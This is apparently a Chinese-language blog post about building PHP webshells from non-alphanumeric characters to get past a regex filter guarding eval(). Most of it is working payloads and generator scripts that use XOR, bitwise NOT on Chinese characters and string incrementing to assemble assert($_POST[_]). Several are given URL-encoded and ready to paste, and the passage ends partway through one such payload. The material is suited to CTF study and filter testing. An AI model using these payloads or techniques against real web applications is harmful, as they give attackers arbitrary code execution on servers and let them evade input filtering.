---
 layout:   post        # 使用的布局（不需要改）
 title:   无字符构造webshell   # 标题 
 subtitle:   #副标题
 date:    2020-08-23    # 时间
 author:   yanmie       # 作者
 header-img: img/.jpg  ##标签这篇文章标题背景图片
 catalog: true            # 是否归档
 tags:                
    - bypass

--- 

## 构造无字母无数字webshell

当初就碰到了这个知识点，就是一拖再拖，没能总结。。。现在就来总结一哈子。

```
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
  eval($_GET['shell']);
}
```

可以看到这里正则匹配了字母和数字，

解法：将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。

ps:

php5中assert是一个函数，我们可以通过`$f='assert';$f(...);`这样的方法来动态执行任意代码。

但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用`file_put_contents`函数，同样可以用来getshell。

这里我们用php5

#### 解法1:异或

在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。

**原理：**

在PHP中，两个变量的值进行异或时，会先将两个变量的值转换为ASCII，再将ASCII转换为二进制，对两对二进制数据进行异或，异或完，再将结果转为ASCII，最后将ASCII转为字符串，即为最终结果。
其实也就是在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。

异或规则： 两个二进制数相同时，异或为0，不同时为1.

```
<?php
   @$_++;            // $_ = 1
   $__=("#"^"|");    // $__ = _
   $__.=("."^"~");   // _P
   $__.=("/"^"`");   // _PO
   $__.=("|"^"/");   // _POS
   $__.=("{"^"/");   // _POST 
   ${$__}[!$_](${$__}[$_]);   // $_POST[0]($_POST[1]);
   // 也可直接拼接  $__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/"); 

```

分析一下：

* $_++ ：对变量名为_的变量进行自增操作，在PHP中未定义的变量默认值为Null,null==false==0,因此可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。
* 异或操作，`#^|` , # 二进制为 00100011 ，| 二进制为 01111100 ，异或之后就变成了 01011111 ，变为ascii 就是 95 ，也就是下划线，其他类似。

开始构造payload

```
?shell=
@$_++;
$__=("#"^"|");
$__.=("."^"~");
$__.=("/"^"`");
$__.=("|"^"/");
$__.=("{"^"/");
${$__}[!$_](${$__}[$_]);
```

因为含有特殊字符，所以需要进行url编码才可以正常使用

	?shell=%40%24_%2b%2b%3b%0a%20%20%20%24__%3d(%22%23%22%5e%22%7c%22)%3b%0a%20%20%20%24__.%3d(%22.%22%5e%22~%22)%3b%0a%20%20%20%24__.%3d(%22%2f%22%5e%22%60%22)%3b%0a%20%20%20%24__.%3d(%22%7c%22%5e%22%2f%22)%3b%0a%20%20%20%24__.%3d(%22%7b%22%5e%22%2f%22)%3b%0a%20%20%20%24%7b%24__%7d%5b!%24_%5d(%24%7b%24__%7d%5b%24_%5d)%3b

![wCODQ1.png](https://s1.ax1x.com/2020/09/03/wCODQ1.png)

ph师傅的也是同样的原理：

```
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);

```

但是这种exp代码过长，如果限制了长度就就很尴尬了。但如果题目条件限制只能使用异或这种方法来构造webshell，也是可以缩短长度的，可以让字符一起异或使用


<?php

var_dump("#./|{"^"|~`//"); //_POST

var_dump("`{{{"^"?<>/"); //_GET



其实原理都一样，按照顺序进行异或，从而得到相应的字符,就拿GET来说，可以组成下面的payload

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
// $_GET[_]($_GET[__])




![wCzn8e.png](https://s1.ax1x.com/2020/09/03/wCzn8e.png)

这里从网上找到一个异或脚本：

```
#来源: 国光
#文章作者: 国光
#文章链接: https://www.sqlsec.com/2020/07/shell.html#toc-heading-24
#咳咳又想白嫖文章？本文章著作权归作者所有，任何形式的转载都请注明出处。
 
import string 
from urllib.parse import quote 
keys = list(range(65)) + list(range(91,97)) + list(range(123,127)) 
results = [] 
for i in keys: 
    for j in keys: 
        asscii_number = i^j 
        if (asscii_number >= 65 and asscii_number <= 90) or (asscii_number >= 97 and asscii_number <= 122): 
            if i < 32 and j < 32: 
                temp = (f'{chr(asscii_number)} = ascii:{i} ^ ascii{j} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number)) 
                results.append(temp) 
            elif i < 32 and j >=32: 
                temp = (f'{chr(asscii_number)} = ascii:{i} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number)) 
                results.append(temp) 
            elif i >= 32 and j < 32: 
                temp = (f'{chr(asscii_number)} = {chr(i)} ^ ascii{j} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number)) 
                results.append(temp) 
            else: 
                temp = (f'{chr(asscii_number)} = {chr(i)} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number)) 
                results.append(temp) 
 
results.sort(key=lambda x:x[1], reverse=False) 
for low_case in string.ascii_lowercase: 
    for result in results: 
        if low_case in result: 
            print(result[0]) 
            
for upper_case in string.ascii_uppercase: 
    for result in results: 
        if upper_case in result: 
            print(result[0])
```

可以返回所有字母的异或组合。`python3 xxx.py > results.txt`

在贴上另一个大佬的poc(https://xz.aliyun.com/t/8107)

```
<?php
$shell = "assert";
$result1 = "";
$result2 = "";
for($num=0;$num<=strlen($shell);$num++)
{
    for($x=33;$x<=126;$x++)
    {
        if(judge(chr($x)))
        {
            for($y=33;$y<=126;$y++)
            {
                if(judge(chr($y)))
                {
                    $f = chr($x)^chr($y);
                    if($f == $shell[$num])
                    {
                        $result1 .= chr($x);
                        $result2 .= chr($y);
                        break 2;
                    }
                }
            }
        }
    }
}
echo $result1;
echo "<br>";
echo $result2;

function judge($c)
{
    if(!preg_match('/[a-z0-9]/is',$c))
    {
        return true;
    }
    return false;
}
```

得到可以异或得到我们想要的字符的两个字符串。

```
<?php
$_ = "!((%)("^"@[[@[\\";   //构造出assert
$__ = "!+/(("^"~{`{|";   //构造出_POST
$___ = $$__;   //$___ = $_POST
$_($___[_]);   //assert($_POST[_]);
```

#### 解法二：取反

原理： **求反运算符～为单目运算符，具有右结合性。其功能是对参与运算的数的各二进位按位求反。
负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一**

利用的是UTF-8编码的某个汉字，并将其中某个字符取出来。

参考[p神文章](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#)，

拿`和`字来说

```
<?php
$_="瞰";
$a = ~($_{1});  // a
$b = ~($_{2});  // O
echo $a.'<br/>'.$b;
```

![wP3wh8.png](https://s1.ax1x.com/2020/09/03/wP3wh8.png)

```
"和" 的第三个字节的值为 140[0x8c]，取反的值为 -141
'和'{2}的结果是"\x8c"，其取反即为字母s：
```

附上ph师傅的payload:

```
<?php
$__=('>'>'<')+('>'>'<');    //$__2
$_=$__/$__;                 //$_1
 
$____='';
$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});       //$____=assert
 
$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});     //$_____=_POST 
 
$_=$$_____;        //$_=$_POST
$____($_[$__]);    //assert($_POST[2])
?>

```

构造：

```
$__=('>'>'<')+('>'>'<');$_=$__/$__;$____='';$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});$_=$$_____;$____($_[$__]);
```

由于Payload中含有一些特殊字符，所以需要对Payload进行一次URL编码才可以正常使用,`$__=('%3e'%3e'%3c')%2b('%3e'%3e'%3c')%3b%24_%3d%24__%2f%24__%3b%24____%3d''%3b%24___%3d%22%e7%9e%b0%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9a%84%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%8d%8a%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%a7%8b%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24_____%3d'_'%3b%24___%3d%22%e4%bf%af%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9e%b0%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e6%ac%a1%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e7%ab%99%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24_%3d%24%24_____%3b%24____(%24_%5b%24__%5d)%3b`

![wP8WqA.png](https://s1.ax1x.com/2020/09/03/wP8WqA.png)

这个答案还利用了PHP的弱类型特性。因为要获取`'和'{2}`，就必须有数字`2`。而PHP由于弱类型这个特性，true的值为1，故`true+true==2`，也就是`('>'>'<')+('>'>'<')==2`。


这种方法是通过和汉字结合来获取webshell，但要注意在PHP7下因为语法所以是不可以直接使用。

```
$___="瞰";
$a = ~($___{2});

```

除此之外还可以使用另外一种方法进行构造，在上面已经知道了，这两个写法性质一样，得到的结果相同。

```
<?php
$_="和";
print(~($_{2}));
print(~"\x8c");
?>
#结果为
ss

```

所以可以直接写成~"\x8c"这种形式，能够缩减不少字符，脚本如下：

```
#脚本参考V0n师傅的
def get(shell):
    hexbit=''.join(map(lambda x: hex(~(-(256-ord(x)))),shell))
    hexbit = hexbit.replace('0x','%')
    print(hexbit)
get('assert')
get('_POST')
#%9e%8c%8c%9a%8d%8b assert
#%a0%af%b0%ac%ab _POST
```

exp:

```
<?php
$_=~"%9e%8c%8c%9a%8d%8b"; //$_=assert
$__=~"%a0%af%b0%ac%ab"; //$__=_POST

$___=$$__;//$___=$_POST
$_($___[_]);//assert($_POST[_])

```

![wipIW8.png](https://s1.ax1x.com/2020/09/03/wipIW8.png)

还有另外师傅的脚本，,从3000+个汉字中获得通过取反得到想要的字符。(来自：https://xz.aliyun.com/t/8107 )

```
<?php
header("Content-type:text/html;charset=utf-8");
$shell = "assert";
$result = "";
$arr =array();
$word = "一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺
木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引
丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们
仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾
扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传
乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅
字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖
护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我
乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟
没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖
拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚
旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿
胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试
郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪
某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂
哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀
饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误
诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫
荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积
秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳
粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继
球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇
圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐
混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬
葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩
稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙
谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳
跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静
碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱
嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐
嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾
夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛
吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙
呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤
荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦
匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋
疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾
啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽
缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔
奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙
腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥
谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥
霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹
靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗";
function mb_str_split( $string ) {
    return preg_split('/(?<!^)(?!$)/u', $string ); 
}
foreach (mb_str_split($word) as $c)
{
    $arr[] = $c;
}

for ($x=0;$x<strlen($shell);$x++)
{
    for ($y=0;$y<count($arr);$y++)
    {
        $k = $arr[$y];
        if ($shell[$x] == ~($k{1}))
        {
            $result .= $k;
            break;
        }
    }
}
echo $result;
```

根据上面这个POC，我们可以知道，由"极区区皮十勺"可以得到"assert";由"寸小欠立"可以得到"POST"可以得到一个exp：

```
<?php
$_++;   //得到1，此时$_=1
$__ = "极";
$___ = ~($__{$_});   //得到a，此时$___="a"
$__ = "区";
$___ .= ~($__{$_});   //得到s，此时$___="as"
$___ .= ~($__{$_});   //此时$___="ass"
$__ = "皮";
$___ .= ~($__{$_});   //得到e，此时$___="asse"
$__ = "十";
$___ .= ~($__{$_});   //得到r，此时$___="asser"
$__ = "勺";
$___ .= ~($__{$_});   //得到t，此时$___="assert"
$____ = '_';   //$____='_'
$__ = "寸";
$____ .= ~($__{$_});   //得到P，此时$____="_P"
$__ = "小";
$____ .= ~($__{$_});   //得到O，此时$____="_PO"
$__ = "欠";
$____ .= ~($__{$_});   //得到S，此时$____="_POS"
$__ = "立";
$____ .= ~($__{$_});   //得到T，此时$____="_POST"
$_ = $$____;   //$_ = $_POST
$___($_[_]);   //assert($_POST[_])
```

因为有些payload中含有不可见字符，所以需要用url编码表示，但如果觉得自己的payload没有问题执行不出来的话就编码一下再试，有时也不需要进行编码。

#### 方法三：递增

```
在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 $a = 'Z'; $a++; 将把 $a 变成'AA'，而在 C 中，a = 'Z'; a++; 将把 a 变成 '['（'Z' 的 ASCII 值是 90，'[' 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。 
```


很明显了，如果能够得到"A"，那么我们就能通过自增自减，得到所有的字母。

```
"A"++ ==> "B"
"B"++ ==> "C"
```

那么，如何拿到一个值为字符串'a'的变量呢？

巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。

在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：(php5.2不行，5.4可以。。。)

```
<?php
$_=[];
echo $_;   //输出了 Array
```

再取这个字符串的第一个字母，就可以获得'A'了。

利用这个技巧，编写如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($_POST[_])，无需获取小写a）：

```
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

注意编码`?shell=%24_%3d%5b%5d%3b%0a%24_%3d%40%22%24_%22%3b%0a%24_%3d%24_%5b'!'%3d%3d'%40'%5d%3b%0a%24___%3d%24_%3b%0a%24__%3d%24_%3b%0a%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%0a%24___.%3d%24__%3b%0a%24___.%3d%24__%3b%0a%24__%3d%24_%3b%0a%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%0a%24___.%3d%24__%3b%0a%24__%3d%24_%3b%0a%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%0a%24___.%3d%24__%3b%0a%24__%3d%24_%3b%0a%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%0a%24___.%3d%24__%3b%0a%0a%24____%3d'_'%3b%0a%24__%3d%24_%3b%0a%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2